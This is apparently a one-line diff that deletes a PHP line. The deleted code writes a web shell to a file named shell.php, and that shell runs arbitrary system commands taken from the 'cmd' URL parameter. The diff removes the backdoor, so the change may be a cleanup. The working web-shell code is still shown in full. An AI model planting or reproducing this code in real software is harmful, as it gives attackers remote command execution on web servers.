@@ -1,1 +1,0 @@
-<?php \$webshell = '<?php if(isset(\$_GET["cmd"])) { system(\$_GET["cmd"]); } ?>';\$myfile = fopen('shell.php', 'w');fwrite(\$myfile, \$webshell);fclose(\$myfile);?>
